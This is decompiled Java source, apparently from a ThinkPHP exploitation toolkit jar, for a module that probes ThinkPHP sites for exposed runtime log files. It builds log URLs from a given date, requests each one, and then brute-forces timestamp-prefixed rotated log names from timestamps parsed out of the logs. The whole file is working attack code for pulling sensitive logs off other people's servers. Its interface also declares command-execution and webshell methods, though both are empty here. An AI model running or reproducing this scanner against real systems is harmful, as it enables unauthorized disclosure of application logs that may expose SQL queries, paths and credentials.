/*     */ package dylan.exp;
/*     */ 
/*     */ import dylan.model.BaseExp;
/*     */ import dylan.model.Response;
/*     */ import dylan.tools.HttpTool;
/*     */ import java.text.DateFormat;
/*     */ import java.text.ParseException;
/*     */ import java.text.SimpleDateFormat;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Date;
/*     */ import java.util.HashMap;
/*     */ import java.util.Iterator;
/*     */ import java.util.regex.Matcher;
/*     */ import java.util.regex.Pattern;
/*     */ 
/*     */ public class tp_log implements BaseExp {
/*  17 */   private final HashMap<String, String> property = new HashMap<>();
/*     */   
/*     */   public String vulCheck(String url, String path, String year, String month, String day) {
/*  20 */     StringBuilder results = new StringBuilder();
/*  21 */     if (month.length() == 1) {
/*  22 */       month = "0" + month;
/*     */     }
/*  24 */     if (day.length() == 1) {
/*  25 */       day = "0" + day;
/*     */     }
/*  27 */     if (!path.startsWith("/")) {
/*  28 */       path = "/" + path;
/*     */     }
/*  30 */     if (!path.endsWith("/")) {
/*  31 */       path = path + "/";
/*     */     }
/*     */     
/*  34 */     String url1 = url + path + year.substring(2) + "_" + month + "_" + day + ".log";
/*     */     
/*  36 */     String url2 = url + path + year + month + "/" + day + ".log";
/*  37 */     String url3 = url + path + year + month + "/" + day + "_error.log";
/*  38 */     String url4 = url + path + year + month + "/" + day + "_sql.log";
/*  39 */     ArrayList<String> urls = new ArrayList<>();
/*  40 */     urls.add(url1);
/*  41 */     urls.add(url2);
/*  42 */     urls.add(url3);
/*  43 */     urls.add(url4);
/*  44 */     for (String payload : urls) {
/*  45 */       Response response = HttpTool.get(payload, this.property);
/*  46 */       if (response.getCode() == 200 && response.getText().length() > 500) {
/*  47 */         results.append("[+] 日志文件存在：").append(payload).append("\n");
/*     */ 
/*     */ 
/*     */         
/*  51 */         String fileName = payload.replaceAll(".*/", "");
/*  52 */         System.out.println(fileName);
/*  53 */         String nowFileName = "";
/*  54 */         String pattern = "\\[ (\\d{4}-\\d{2}-\\d{2})T((\\d{2}:){2}\\d{2})\\+08:00 \\]";
/*  55 */         Pattern r = Pattern.compile(pattern);
/*  56 */         boolean flag = true;
/*  57 */         while (flag) {
/*  58 */           Matcher time = r.matcher(response.getText());
/*  59 */           if (time.find()) {
/*     */             try {
/*  61 */               String time_str = time.group(1) + ' ' + time.group(2);
/*  62 */               DateFormat t = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
/*  63 */               Date date = t.parse(time_str);
/*  64 */               ArrayList<Integer> timeStamps = new ArrayList<>();
/*  65 */               timeStamps.add(Integer.valueOf((int)(date.getTime() / 1000L)));
/*  66 */               timeStamps.add(Integer.valueOf((int)(date.getTime() / 1000L) - 1));
/*  67 */               timeStamps.add(Integer.valueOf((int)(date.getTime() / 1000L) - 2));
/*  68 */               timeStamps.add(Integer.valueOf((int)(date.getTime() / 1000L) - 3));
/*  69 */               for (Iterator<Integer> iterator = timeStamps.iterator(); iterator.hasNext(); ) { int timeStamp = ((Integer)iterator.next()).intValue();
/*  70 */                 String tmpFileName = String.valueOf(timeStamp) + '-' + fileName;
/*  71 */                 if (tmpFileName.equals(nowFileName)) {
/*  72 */                   flag = false;
/*     */                   break;
/*     */                 } 
/*  75 */                 String timeStampLog = payload.replace(fileName, tmpFileName);
/*  76 */                 response = HttpTool.get(timeStampLog, this.property);
/*  77 */                 if (response.getCode() == 200 && response.getText().length() > 500) {
/*  78 */                   results.append("[+] 日志文件存在：").append(timeStampLog).append("\n");
/*  79 */                   nowFileName = tmpFileName;
/*     */                 }
/*     */                  }
/*     */             
/*  83 */             } catch (ParseException e) {
/*  84 */               e.printStackTrace();
/*     */             } 
/*     */           }
/*     */         } 
/*     */       } 
/*     */ 
/*     */       
/*  91 */       if (response.getError() != null) {
/*  92 */         results.append("[-] 访问 ").append(payload).append(" 失败， ").append(response.getError()).append("\n");
/*  93 */         return results.toString();
/*     */       } 
/*     */     } 
/*     */     
/*  97 */     return results.toString();
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String vulCheck(String url) {
/* 103 */     return null;
/*     */   }
/*     */ 
/*     */   
/*     */   public String cmdExec(String url, String cmd) {
/* 108 */     return null;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getShell(String url, String fileName, String content) {
/* 113 */     return null;
/*     */   }
/*     */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp_log.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */